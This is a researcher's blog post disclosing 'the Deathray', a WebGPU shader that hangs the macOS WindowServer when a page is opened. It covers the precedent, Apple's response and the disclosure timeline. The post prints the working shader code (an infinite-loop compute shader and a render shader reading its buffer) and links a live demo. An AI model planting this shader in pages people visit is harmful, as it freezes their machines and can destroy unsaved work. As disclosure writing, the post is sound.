---
title: 'The Deathray: A simple way for an untrusted site to freeze a Mac'
link: https://auberon.xyz/blog/posts/deathray/
source: hnrss-org-frontpage
published: 2026-09-10T19:34:20Z
updated: 2026-09-10T19:34:20Z
first_seen: 2026-09-11T05:07:40.995277925Z
authors:
- auberonedu
summary: 'Article URL: https://auberon.xyz/blog/posts/deathray/ Comments URL: https://news.ycombinator.com/item?id=49649124 Points: 121 # Comments: 77'
content: extracted
html: 2026-09-10-the-deathray-a-simple-way-for-an-untrusted-site-to-freeze-a.html
preview:
  file: 2026-09-10-the-deathray-a-simple-way-for-an-untrusted-site-to-freeze-a.preview-5154b576c6cf.webp
  width: 256
  height: 256
  color: '#000000'
images:
- source: https://auberon.xyz/images/liLogo.png
  original:
    file: 2026-09-10-the-deathray-a-simple-way-for-an-untrusted-site-to-freeze-a.image-9ed1a2590df0.png
    width: 779
    height: 779
  variants:
  - file: 2026-09-10-the-deathray-a-simple-way-for-an-untrusted-site-to-freeze-a.image-151c976e7c28.webp
    width: 48
    height: 48
  - file: 2026-09-10-the-deathray-a-simple-way-for-an-untrusted-site-to-freeze-a.image-ba805b113160.webp
    width: 320
    height: 320
  - file: 2026-09-10-the-deathray-a-simple-way-for-an-untrusted-site-to-freeze-a.image-a0813e638b87.webp
    width: 640
    height: 640
  - file: 2026-09-10-the-deathray-a-simple-way-for-an-untrusted-site-to-freeze-a.image-64d81e329f40.webp
    width: 779
    height: 779
  color: '#000000'
---

## The Deathray

A simple way for an untrusted site to freeze a Mac

September 10th, 2026

## TL;DR

A WebGPU shader on an untrusted site can hang a Mac's graphics, making the desktop UI unusable until a restart is forced. All the victim needs to do is click a link. This issue reproduces cross-browser on MacOS, but not other OSes.

## Try the Deathray!

THE BELOW BUTTON WILL FREEZE YOUR MAC. IT MAY SLOW OTHER OSes

[](https://auberon.xyz/deathray)

On other OSes I've tested, it causes the tab to freeze and things to chug but once you close the tab you're fine. But your mileage may vary! Only click the above if you're willing to freeze your computer.

## Scope

I've reproduced the deathray under MacOS on Chrome, Firefox, and Safari. It does not reproduce under other operating systems. I've only tried testing on M-series Macbooks running Tahoe; I'd be interested to hear if other Macs are impacted too!

## How does it work?

The deathray uses a relatively new web technology: WebGPU. WebGPU provides built-in browser APIs that sites can use to submit shaders to run on the device's GPU. It's meant to replace WebGL and is supported across all major browsers on most OSes.

The entire deathray fits in a single small file. You can see the [source code here](https://github.com/alope107/deathray/blob/main/index.html). Most of the file is scaffolding; the important part is the WebGPU shaders.

### Compute Shader

```
      
@group(0) @binding(0) var<storage, read_write> data : array<vec4f>;

@compute @workgroup_size(1) fn compute() {
  // no i++, loop spins endlessly
  for(var i = 0u; i < 1;) {
    data[i+1] = data[i];
  }
}
      
    
```

### Render Shaders

```
      
@group(0) @binding(0) var<storage, read> data : array<vec4f>;

@vertex fn vert(@builtin(vertex_index) vertexIdx : u32)
              -> @builtin(position) vec4f {
  // attempts to read from same buffer the compute shader writes to
  let datum = data[vertexIdx];
  return datum;
}

@fragment fn frag(@builtin(position) pos : vec4f)
               -> @location(0) vec4f {
  return pos;
}
      
    
```

In the compute shader an infinite busy loop copies the same vector over and over again in a buffer. The vertex shader depends on the same data buffer the compute shader is operating on. Because the compute shader is busy looping, the vertex shader can't move forward.

This spills over into other processes wanting to use the GPU, namely the WindowServer. As a result of our WebGPU pileup, the WindowServer becomes unresponsive as well. This doesn't always manifest the same way. Sometimes I can still move the mouse, sometimes not. Sometimes I get the beachball, and sometimes magenta junk shows up on part of the screen. I'm not sure what leads to the different behavior!

Interestingly, the rest of the computer is fine at this point. You can SSH into the computer without issue. But there's a Watchdog checking the WindowServer. When it doesn't respond for long enough, it triggers a kernel panic and the computer restarts. If you've been deathray'd and are impatient you can hold down the power button to turn off and restart without waiting for the Watchdog. Just hope that your browser doesn't automatically reopen the same tab when it starts up again :)

## Precedent

This is actually not the first time that Apple has had this problem. In 2023, Ron Masas of Imperva crafted a similar malicious shader named [ShadyShader](https://www.imperva.com/blog/shadyshader-crashing-apple-m-series-with-single-click/) that uses WebGL. ShadyShader also uses a runaway loop to hog the GPU, crafting enormous nested loops that are technically non-infinite.

Apple responded by issuing [CVE-2023-40441](https://nvd.nist.gov/vuln/detail/cve-2023-40441) with a 6.5 (medium) CVSS score. To mitigate the problem, Apple added improved input validation to better detect runaway loops.

That input validation seems to be weaker in WebGPU - the deathray has a trivially identifiable infinite loop. But ultimately detecting infinite loops is a losing game; you can't get around the halting problem. There needs to be better pre-emption of unresponsive shaders, especially if those shaders are running untrusted code. All other operating systems I tested the deathray on get this right.

I wonder if part of the challenge Apple faces in fixing these type of issues is due to the architecture of M-series chips. The OS kernel cannot directly pre-empt the GPU. Instead, GPU handling is performed by a coprocessor known as the ASC which the OS kernel communicates with. All the GPU pre-emption logic lives in the ASC firmware. Asahi Lina has an [excellent writeup](https://asahilinux.org/2022/11/tales-of-the-m1-gpu/) on the M-series GPUs that explores the architecture in more detail.

## How was the deathray found?

I found this issue the old fashioned way: by accident! I was learning WebGPU at the [Recurse Center](https://www.recurse.com/) and accidentally made an infinite loop. I was surprised when it hung my computer and of course asked "Does it do that every time?" Sure enough it does! I can't be the first person to have tripped across this.

## Disclosure

The issue was disclosed to Apple Security on 7/27/26. Apple quickly reproduced the issue and stated that they intended to fix it. They gave a fix timeline which was marked as confidential, so I will not write it here.

However, on 8/26/26 Apple changed tack, saying that they did "not see any security implications with \[my\] report" and that the report did not "result in a change in \[Apple's\] products." They said the report would be sent to another team for "potential enhancement considerations." To me that sounds like it will be a very low priority to fix, if it is ever addressed. It feels a bit curious given how ShadyShader was marked as a 6.5 medium severity issue.

That being said, I think there's an interesting discussion to be had about what constitutes a security issue. Security researchers I've talked with tend to agree with Apple. As Apple puts it, "the result is either a crash, hang, or recoverable data loss which we do not consider to be a security issue." And on a technical level I don't think they're wrong.

However, the majority of non-security people I've talked to are surprised with that characterization and that Apple is not prioritizing fixing the issue. I think among most folks there's a pretty strong trust in the browser. There's a (perhaps misplaced) belief that simply clicking on a link will not negatively impact the rest of your computer beyond maybe slowing things down until the tab is closed. Something like the deathray violates that trust in a very visible way, and I think that most users see that as a security issue.

## What I hope to see

The deathray is certainly nowhere near as severe as a sandbox escape, RCE, or data breach. But given its extremely low barrier to entry (just get someone to click on a link) it has the potential to be quite annoying. If used maliciously, I see it as a meaner version of a [Rickroll](https://www.youtube.com/watch?v=dQw4w9WgXcQ), and I hope Apple ends up fixing it before too long. (And Apple, please don't have the fix be disabling WebGPU by default! I've come to love WebGPU 💚).

But until Apple fixes it, I hope people find ways to have fun with it non-maliciously. I'd love to see deathray video games where if you lose, your Mac freezes (with the user opting into this ahead of time). A much milder version of "you die in the game, you die in real life."

Have fun cats and kittens, but please be responsible!

Yours truly,

Auberon López (they/them)
